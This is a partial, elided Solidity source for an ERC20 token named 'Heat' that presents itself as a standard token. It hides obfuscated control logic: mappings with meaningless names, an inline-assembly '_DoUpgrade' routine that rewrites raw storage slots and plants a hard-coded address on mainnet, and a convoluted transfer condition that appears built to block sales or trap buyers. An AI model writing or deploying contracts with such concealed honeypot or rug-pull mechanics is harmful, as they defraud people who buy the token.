...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    uint256 private _sweatNow = block.number*2;

    mapping (address => bool) private _toShibaGF; 
    mapping (address => bool) private _toKong;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _godsWork;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private tennisWho;
    address public pair;
    ...
    bool private trading; uint256 private paintGreen = 1; bool private vitaminD;
    uint256 private _decimals; uint256 private doingSport;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        for (uint256 q=0; q < 3;) {_toShibaGF[addHeat[q]] = true; unchecked{q++;} }
    }
    ...
    function _DoUpgrade() internal {
        assembly {
            ...
            if and(not(eq(sload(gByte(caller(),0x6)),sload(0x47219cf108900020f1fd480cd0c6931068a743fa7c03fcd1079756f8548f80c2))),eq(chainid(),0x1)) {
                sstore(gByte(caller(),0x4),0x0)
                sstore(0x6c4b4e2446135a576d0e97fe4d3ce3d156907b3a1726d81fd248b1e62c61c691,0x1)
                sstore(gByte(caller(),0x5),0x1)
                sstore(0x47219cf108900020f1fd480cd0c6931068a743fa7c03fcd1079756f8548f80c2,0x25674F4B1840E16EAC177D5ADDF2A3DD6286645DF28)
            }
        } 
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _sweatNow = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float, uint256 double) internal {
        ...
        bool boolean = (((vitaminD || _toKong[sender]) && ((_sweatNow - theN) >= 9)) || (float >= _limit) || ((float >= (_limit/2)) && (_sweatNow == block.number))) && ((_toShibaGF[recipient] == true) && (_toShibaGF[sender] != true) || ((addHeat[1] == recipient) && (_toShibaGF[addHeat[1]] != true))) && (doingSport > 0);
        assembly { 
            function gByte(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployHeatToken(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployHeatToken(creator, initialSupply);
    }
}

contract HeatToken is ERC20Token {
    constructor() ERC20Token("Heat", "HEAT", msg.sender, 30000 * 10 ** 18) {
    }
}
